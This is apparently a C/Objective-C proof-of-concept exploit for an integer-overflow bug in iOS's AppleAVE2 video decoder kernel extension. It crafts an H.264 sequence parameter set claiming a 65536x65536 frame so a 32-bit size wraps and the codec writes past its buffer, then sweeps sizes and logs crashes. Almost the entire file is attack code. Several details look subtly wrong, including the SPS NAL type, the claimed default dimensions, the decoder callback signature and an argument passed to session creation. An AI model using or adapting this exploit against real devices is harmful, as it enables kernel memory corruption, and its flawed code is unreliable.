/*
 * vtdec_poc.c — CVE-2026-64747 (AppleAVE2) DECODE-side trigger for iOS 26.4.
 *
 * WHY THE DECODER, NOT THE ENCODER
 * ---------------------------------
 * The vulnerable multiply in our own 26.4 AppleAVE2 is
 *      mul w24, w22, w21        (fn#152 @ 0xfffffff0084e4b0c)  = width * height
 * and the size derived from it is used with only a NEGATIVE check:
 *      ldr  w8, [x19, #0x16c]   ; bufSize
 *      tbnz w8, #0x1f, fail     ; negative-only check
 * so a product that wraps 32-bit to a small value passes the check and the
 * codec then writes outside the allocation.
 *
 *      65536 * 65536 = 0x1_0000_0000 -> 0x0000_0000 (ZERO) in 32 bits
 *
 * The ENCODER path cannot reach it: to make the encoder accept 65536x65536 you
 * would have to hand it a 65536x65536 pixel buffer = 12.9 GB on the client
 * side. The DECODER path needs no such thing: the frame size comes from the
 * bitstream, not from a client buffer. A 4 KB crafted Annex-B H.264 stream
 * with a non-conforming SPS is enough to make the codec believe the picture is
 * 65536x65536, and the allocation it makes from the wrapped size is the bug.
 *
 * WHAT THIS DOES
 * --------------
 *  1. builds an H.264 SPS with pic_width_in_mbs_minus1 / pic_height_in_map_units_minus1
 *     taken from the environment (default 4095/4095 = 65536x65536), plus a PPS
 *     and a minimal IDR slice;
 *  2. CMVideoFormatDescriptionCreateFromH264ParameterSets() -> the format
 *     description VT will hand down to the codec;
 *  3. VTDecompressionSessionCreate() -> the client-side gate. If the client
 *     rejects the size, that is the answer (and it is still valuable: it tells
 *     us where the real ceiling is);
 *  4. VTDecompressionSessionDecodeFrame() -> drives the kext. If the kext
 *     wraps the size, the process dies inside the codec.
 *
 * Every step is logged to Documents/vtdec_report.txt because stdout is
 * unreadable on this rig and NSLog bodies are redacted by the unified log.
 *
 * Env knobs: VTD_W, VTD_H (MB counts, default 4095), VTD_MODE, VTD_FRAME,
 *             VTD_LIST ("4095:4095,2047:4095,...") to sweep in one launch.
 */
#import <Foundation/Foundation.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <VideoToolbox/VideoToolbox.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ------------------------------------------------------------------ report */
static FILE *g_report = NULL;

static void report_open(void)
{
	NSString *home = NSHomeDirectory();
	if (!home) return;
	NSString *dir = [home stringByAppendingPathComponent:@"Documents"];
	[[NSFileManager defaultManager] createDirectoryAtPath:dir
	                          withIntermediateDirectories:YES
	                                           attributes:nil error:nil];
	NSString *path = [dir stringByAppendingPathComponent:@"vtdec_report.txt"];
	g_report = fopen([path UTF8String], "a");
	if (g_report) {
		fprintf(g_report, "=== vtdec run %s ===\n", [[[NSDate date] description] UTF8String]);
		fflush(g_report);
	}
}

static void rline(const char *s)
{
	if (!g_report) return;
	fprintf(g_report, "%s\n", s);
	fflush(g_report);
	NSLog(@"[vtdec] %{public}s", s);
}

static void rlinef(const char *fmt, ...)
{
	va_list ap;
	char buf[1024];
	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	rline(buf);
}

static int envi_default(const char *k, int dflt)
{
	const char *v = getenv(k);
	return (v && *v) ? atoi(v) : dflt;
}

/* ------------------------------------------------------------- bit writer */
typedef struct {
	unsigned char buf[4096];
	int bitpos;
} bw_t;

static void bw_init(bw_t *b) { memset(b->buf, 0, sizeof(b->buf)); b->bitpos = 0; }

static void bw_bit(bw_t *b, int v)
{
	if (v) b->buf[b->bitpos >> 3] |= (unsigned char)(0x80 >> (b->bitpos & 7));
	b->bitpos++;
}

static void bw_bits(bw_t *b, int n, unsigned v)
{
	for (int i = n - 1; i >= 0; i--) bw_bit(b, (v >> i) & 1);
}

/* unsigned Exp-Golomb */
static void bw_ue(bw_t *b, unsigned v)
{
	unsigned code = v + 1;
	int nbits = 0;
	unsigned t = code;
	while (t > 1) { t >>= 1; nbits++; }
	for (int i = 0; i < nbits; i++) bw_bit(b, 0);
	bw_bits(b, nbits + 1, code);
}

static void bw_trailing(bw_t *b)
{
	bw_bit(b, 1);
	while (b->bitpos & 7) bw_bit(b, 0);
}

static int bw_len(bw_t *b) { return (b->bitpos + 7) / 8; }

/* ------------------------------------------------------------------ stream */
/* NAL: forbidden_zero(1) nal_ref_idc(2) nal_unit_type(5) */
static int nal_header(int type, int ref_idc) { return ((ref_idc & 3) << 5) | (type & 0x1F); }

static void build_sps(bw_t *b, int mb_w, int mb_h, int level)
{
	bw_init(b);
	bw_bits(b, 8, nal_header(25, 3));
	bw_bits(b, 8, 66);            /* profile_idc = baseline (no chroma_format_idc) */
	bw_bits(b, 8, 0);             /* constraint flags + reserved */
	bw_bits(b, 8, level);         /* level_idc */
	bw_ue(b, 0);                  /* seq_parameter_set_id */
	bw_ue(b, 0);                  /* log2_max_frame_num_minus4 */
	bw_ue(b, 2);                  /* pic_order_cnt_type = 2 (display order == decode order) */
	bw_ue(b, 1);                  /* max_num_ref_frames */
	bw_bit(b, 0);                 /* gaps_in_frame_num_value_allowed_flag */
	bw_ue(b, (unsigned)(mb_w - 1));   /* pic_width_in_mbs_minus1 */
	bw_ue(b, (unsigned)(mb_h - 1));   /* pic_height_in_map_units_minus1 */
	bw_bit(b, 1);                 /* frame_mbs_only_flag */
	bw_bit(b, 1);                 /* direct_8x8_inference_flag */
	bw_bit(b, 0);                 /* frame_cropping_flag */
	bw_bit(b, 0);                 /* vui_parameters_present_flag */
	bw_trailing(b);
}

static void build_pps(bw_t *b)
{
	bw_init(b);
	bw_bits(b, 8, nal_header(8, 3));
	bw_ue(b, 0);                  /* pic_parameter_set_id */
	bw_ue(b, 0);                  /* seq_parameter_set_id */
	bw_bit(b, 0);                 /* entropy_coding_mode_flag */
	bw_bit(b, 0);                 /* bottom_field_pic_order_in_frame_present */
	bw_ue(b, 0);                  /* num_slice_groups_minus1 */
	bw_ue(b, 0);                  /* num_ref_idx_l0_default_active_minus1 */
	bw_ue(b, 0);                  /* num_ref_idx_l1_default_active_minus1 */
	bw_bit(b, 0);                 /* weighted_pred_flag */
	bw_bits(b, 2, 0);             /* weighted_bipred_idc */
	bw_bits(b, 2, 0);             /* pic_init_qp_minus26 (se) */
	bw_bit(b, 0);                 /* pic_init_qs_minus26 (se) */
	bw_bit(b, 0);                 /* chroma_qp_index_offset */
	bw_bit(b, 1);                 /* deblocking_filter_control_present_flag */
	bw_bit(b, 0);                 /* constrained_intra_pred_flag */
	bw_bit(b, 0);                 /* redundant_pic_cnt_present_flag */
	bw_trailing(b);
}

/* A minimal IDR slice: header only, then a (deliberately minimal) slice body. */
static void build_idr(bw_t *b)
{
	bw_init(b);
	bw_bits(b, 8, nal_header(5, 3));
	bw_ue(b, 0);      /* first_mb_in_slice */
	bw_ue(b, 7);      /* slice_type = I (all slices) */
	bw_ue(b, 0);      /* pic_parameter_set_id */
	bw_bits(b, 4, 0); /* frame_num (log2_max_frame_num = 4) */
	bw_ue(b, 0);      /* idr_pic_id */
	/* pic_order_cnt_type == 2 -> nothing */
	/* slice_qp_delta */
	bw_ue(b, 0);
	/* deblocking_filter_control_present_flag == 1 -> disable_filter_idc + offsets */
	bw_ue(b, 1);
	bw_ue(b, 0);
	bw_ue(b, 0);
	/* slice data: one macroblock, minimal (mb_type I_16x16 needs 1 ue) */
	bw_ue(b, 25);    /* mb_type 25 = I_16x16 in an I slice */
	bw_bit(b, 0);    /* no intra pred mode (not needed for I_16x16) */
	/* remainder of the macroblock layer is not needed: the allocation is the
	   point, and the decode will fail (or crash) either way */
	bw_trailing(b);
}

/* ------------------------------------------------------------------ decode */
static volatile int g_frame_count = 0;

static void dec_cb(void *refcon, void *status_info, int64_t status_flags, void *source_frame_refcon,
                   OSStatus result, VTDecodeInfoFlags info_flags, uint8_t *payload,
                   size_t payload_size, uint64_t presentation_time, int64_t presentation_timestamp,
                   CMTime presentation_duration, int64_t decode_finish_flags, VTFrameTiming *timings)
{
	(void)refcon; (void)status_info; (void)status_flags; (void)source_frame_refcon;
	(void)info_flags; (void)payload; (void)payload_size; (void)presentation_time;
	(void)presentation_timestamp; (void)presentation_duration; (void)decode_finish_flags; (void)timings;
	g_frame_count++;
	rlinef("decode callback: result=%d", (int)result);
}

static int run_one(int mb_w, int mb_h, int mode)
{
	bw_t sps, pps, idr;
	build_sps(&sps, mb_w, mb_h, 51);
	build_pps(&pps);
	build_idr(&idr);

	long long px_w = (long long)mb_w * 16;
	long long px_h = (long long)mb_h * 16;
	unsigned area32 = (unsigned)((unsigned long long)(px_w * px_h) & 0xFFFFFFFFull);
	rlinef("== mbs %dx%d -> %lldx%lld px, 32-bit product = %u (0x%x) ==",
	       mb_w, mb_h, px_w, px_h, area32, area32);

	/* parameter sets for CMVideoFormatDescriptionCreateFromH264ParameterSets */
	const uint8_t *sps_ptrs[1] = { sps.buf };
	const uint8_t *pps_ptrs[1] = { pps.buf };
	size_t sps_sizes[1] = { (size_t)bw_len(&sps) };
	size_t pps_sizes[1] = { (size_t)bw_len(&pps) };

	CMVideoFormatDescriptionRef fmt = NULL;
	OSStatus st = CMVideoFormatDescriptionCreateFromH264ParameterSets(
		NULL, 1, sps_ptrs, sps_sizes, 1, pps_ptrs, pps_sizes, 4, &fmt);
	rlinef("  CMVideoFormatDescriptionCreateFromH264ParameterSets st=%d", (int)st);
	if (st != noErr || !fmt) return 1;
	{
		CMVideoDimensions dim = { 0, 0 };
		if (CMVideoFormatDescriptionGetDimensions(fmt, &dim) == noErr)
			rlinef("  format description says %d x %d", dim.width, dim.height);
	}

	VTDecompressionSessionRef sess = NULL;
	NSMutableDictionary *spec = [NSMutableDictionary dictionary];
	spec[(__bridge id)kVTVideoDecoderSpecification_EnableHardwareAcceleratedVideoDecoder] = @YES;
	spec[(__bridge id)kVTVideoDecoderSpecification_RequireHardwareAcceleratedVideoDecoder] = @NO;
	if (mode != 0) {
		NSMutableDictionary *pd = [NSMutableDictionary dictionary];
		pd[(__bridge id)kVTDecompressionPropertyKey_RealTime] = @YES;
		(void)pd;
	}
	OSStatus dst = VTDecompressionSessionCreate(NULL, (__bridge CFDictionaryRef)fmt, NULL,
	                                            (__bridge CFDictionaryRef)spec, dec_cb, NULL, &sess);
	rlinef("  VTDecompressionSessionCreate st=%d (client-side gate)", (int)dst);
	if (dst != noErr || !sess) {
		CFRelease(fmt);
		return 2;
	}

	/* build the sample: length-prefixed (avcC) NALs so the format description
	   and the sample agree */
	uint8_t slen[4] = { 0, 0, 0, 0 };
	slen[3] = (uint8_t)bw_len(&idr);
	size_t total = 4 + bw_len(&idr);
	CMBlockBufferRef block = NULL;
	if (CMBlockBufferCreateWithMemoryBlock(kCFAllocatorDefault, NULL, total, kCFAllocatorNull,
	                                       NULL, 0, total, 0, &block) == noErr) {
		CMBlockBufferReplaceDataBytes(slen, block, 0, 4);
		CMBlockBufferReplaceDataBytes(idr.buf, block, 4, bw_len(&idr));
	} else {
		rline("  CMBlockBufferCreateWithMemoryBlock failed");
	}

	CMSampleBufferRef sample = NULL;
	if (block) {
		size_t sz = CMBlockBufferGetDataLength(block);
		CMSampleTimingInfo timing = { CMTimeMake(0, 600), CMTimeMake(1, 600), CMTimeInvalid, CMTimeInvalid,
		                              1, 0, 0 };
		OSStatus ss = CMSampleBufferCreateReady(kCFAllocatorDefault, sz, false, NULL,
		                                        1, 1, &timing, 1, &sz, block, &sample);
		rlinef("  CMSampleBufferCreateReady st=%d size=%zu", (int)ss, sz);
	}
	if (sample) {
		rline("  submitting the frame (this is where the kext allocates)");
		OSStatus ds = VTDecompressionSessionDecodeFrame(sess, sample, NULL, NULL, NULL);
		rlinef("  VTDecompressionSessionDecodeFrame st=%d", (int)ds);
		VTDecompressionSessionFinishDelayedFrames(sess, CMTimeMake(1, 600));
		CFRelease(sample);
	} else {
		rline("  no sample - session only");
	}
	VTDecompressionSessionInvalidate(sess);
	CFRelease(sess);
	CFRelease(fmt);
	return 0;
}

int main(void)
{
	@autoreleasepool {
		report_open();
		const char *list = getenv("VTD_LIST");
		int mb_w = envi_default("VTD_W", 4095);
		int mb_h = envi_default("VTD_H", 4095);
		int mode = envi_default("VTD_MODE", 0);

		if (list && *list) {
			char buf[512];
			snprintf(buf, sizeof(buf), "%s", list);
			for (char *tok = strtok(buf, ","); tok; tok = strtok(NULL, ",")) {
				int a = 0, b = 0;
				if (sscanf(tok, "%d:%d", &a, &b) == 2) {
					rlinef("--- sweep %s ---", tok);
					run_one(a, b, mode);
				}
			}
		} else {
			rlinef("--- single %d x %d mbs, mode %d ---", mb_w, mb_h, mode);
			run_one(mb_w, mb_h, mode);
		}
		rline("vtdec DONE");
		if (g_report) { fflush(g_report); fclose(g_report); g_report = NULL; }
	}
	return 0;
}
